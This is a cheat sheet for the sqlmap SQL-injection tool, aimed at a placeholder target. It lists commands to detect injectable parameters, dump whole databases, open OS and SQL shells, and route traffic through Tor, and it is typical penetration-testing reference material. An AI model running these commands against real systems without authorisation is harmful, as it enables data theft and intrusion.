# SQLMAP HELP DESK 
## Simple Usage
If you don’t know anything about the target site then use the normal command first, Observe if the SQLMap found something juicy for you

```bash
sqlmap -u “https://target_site.com/page/”
```

## Automatic GET request parameter
```bash
sqlmap -u “https://target_site.com/page?p1=value1&p2=value2”
```
## Specify the GET request parameters to Exploit
You can specify on which parameter you want to check or exploit the sql injection using just “-p” flag.
```bash
sqlmap -u “https://target_site.com/page?p1=value1&p2=value2” -p p1
```
## Use POST requests (Test All parameters)
```bash
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2"
```
## SQLMap Request file as input
You can specify a request file containing the HTTP request, You can get it quickly from BurpSuite.

## sqlmap -r request.txt
Here you can specify the targeted parameter or sqlmap will recognize and will test for all the parameters found.

## Use Authenticated Session With Cookie
```bash
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --cookie="Session_Cookie_Value"
```
## Use Authenticated Session with Auth Headers
```bash
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --headers="Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l"
```
## Basic Authentication
```bash
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --auth-type=basic --auth-cred=username:password
```
## Use Previously created Session as SQLmap input (-s)
If you got SQL injection positive somewhere, then sqlmap will automatically create a session file(.sqlite) for later use. Now, If you want to try some other commands later, you can use the session file directly (It will save your time to re-try all the possible payloads and identify the vulnerability and all.)
```bash
sqlmap -u “https://target_site.com/page?p1=value1" -s SESSION-FILE.sqlite --dbs
```
You can use this file from the home path of the SQLMap tool’s output directory.

## Post Exploitation Commands
If the SQL injection vulnerability is observed positive then you can use the following commands to Exploit the SQL injection vulnerability.

## List the Databases
```bash
sqlmap -u “https://target_site.com/page?p1=value1” --dbs
```
## List Tables of Database TARGET_DB
```bash
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --tables
```
## List Columns of Table TARGET_TABLE of Database TARGET_DB
```bash
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --columns
```
## Dump Specific Data of Columns of Table TARGET_TABLE of Database TARGET_DB
```bash
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE -C "Col1,Col2" --dump
```
## Fully Dump Table TARGET_TABLE of Database TARGET_DB
```bash
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --dump
```
## Dump full Database
```bash
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --dump
```
##Custom SQL query
```bash
sqlmap -u “https://target_site.com/page?p1=value1” --sql-query "SELECT * FROM TARGET_DB;"
```
## Get OS Shell
```bash
sqlmap -u “https://target_site.com/page?p1=value1” --os-shell
```
##Get SQL shell
```bash
sqlmap -u “https://target_site.com/page?p1=value1” --sqlmap-shell
```

# SQLMap Proxy
## Proxy through Burpsuite
```bash
sqlmap -u “https://target_site.com/page?p1=value1” --proxy="http://127.0.0.1:8080/"
```
## Use Tor Socks5 proxy
```bash
sqlmap -u “https://target_site.com/page?p1=value1” --tor --tor-type=SOCKS5 --check-tor --dbs
```

# Extra
## Specify The Database Type
```bash
sqlmap -u “https://target_site.com/page?p1=value1” --dbms=mysql
```
You can use other DBMS types like MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, Percona, MemSQL, TiDB, CockroachDB, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift, Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle, Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB, FrontBase, etc.

# Attack Techniques
–technique Specify a letter or letters of BEUSTQ to control the exploit attempts:

* B: Boolean-based blind
* E: Error-based
* U: Union query-based
* S: Stacked queries
* T: Time-based blind
* Q: Inline queries
```bash
sqlmap -u “https://target_site.com/page?p1=value1” --technique=BEUSTQ
```
## Specify the Injection Techniques
You can specify the difficulty levels using two flags,
```bash
–level = LEVEL     Level of tests to perform (1-5, default 1)
–risk=RISK         Risk of tests to perform (0-3, default 1)
sqlmap -u “https://target_site.com/page?p1=value1” --risk=3 --level=5
Option: --risk
```
This option requires an argument that specifies the risk of tests to perform. There are three risk values.

```bash
–riks=1: 1 is the default value which is for the majority of SQL injection points.

–riks=2: Adds to the default level the tests for heavy query time-based SQL injections

–riks=3: Value 3 adds also OR-based SQL injection tests.

Option: --level
```
When the value of --level is >= 2 it tests also HTTP Cookie header values. When this value is >= 3 it tests also HTTP User-Agent and HTTP Referer header value for SQL injections.

Use Default Options for the process
Use –batch flag to use all the default options or used for non-interactive sessions. (By specifying –batch flag, sqlmap will not ask you for the (Y/N) choice rather then it will smartly choose according to the needs.)
```bash
sqlmap -u “https://target_site.com/page?p1=value1” --batch
–force-ssl flag
```
Force SQLmap to use SSL or TLS for its requests.

# Conclusion:
SQLMap is a fantastic tool for SQL Injection attacks. By analyzing the above cheat sheet we can create a general-purpose command to use most useful flags in it,
```bash
sqlmap -u “https://target_site.com/page/”--proxy="http://127.0.0.1:8080/" --cookie=”SESSID=lred0jr6na1vmci;” --data=”p1=value1” -p p1 --level=5 --risk=3 --dbms=mysql --technique=BEUSTQ --force-ssl
```
As always I hope you found this SQLMap cheat sheet useful. Guys, feel free to show the post some love and share the cheat sheet to your friends and colleagues. I will also post in a detailed SQLMap tutorial soon.

# References
* http://sqlmap.org/
* https://tools.kali.org/vulnerability-analysis/sqlmap
* https://gitlab.com/kalilinux/packages/sqlmap
